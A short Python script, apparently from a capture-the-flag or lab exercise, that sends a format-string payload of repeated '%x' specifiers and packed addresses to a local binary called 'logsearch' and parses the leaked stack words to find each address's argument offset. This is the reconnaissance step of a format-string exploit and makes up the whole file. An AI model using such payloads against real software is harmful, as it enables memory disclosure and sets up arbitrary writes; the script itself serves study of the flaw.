#!/usr/bin/env python3
import re
import struct
import subprocess


def run(payload: bytes) -> str:
    p = subprocess.run(
        ["./logsearch"],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=".",
        timeout=5,
    )
    return p.stdout.decode(errors="replace")


def main() -> None:
    # Addresses we want to locate on the "printf varargs" stack walk
    addrs = [0x0804B372, 0x0804B374, 0x0804B376, 0x0804B378]
    trail = b"".join(struct.pack("<I", a) for a in addrs)

    # Print many stack dwords with %x, then append raw addresses.
    payload = b"AAA." + (b".%x" * 70) + b".END" + trail + b"\n"
    print("payload_len", len(payload))
    out = run(payload)
    print(out)

    sline = next(l for l in out.splitlines() if "Searching for:" in l)
    after = sline.split("AAA.", 1)[1]
    fields = after.split(".")

    vals = []
    for f in fields:
        if re.fullmatch(r"[0-9a-fA-F]+", f):
            vals.append(int(f, 16))

    for a in addrs:
        poss = [idx for idx, v in enumerate(vals, start=1) if v == a]
        print(hex(a), poss)


if __name__ == "__main__":
    main()

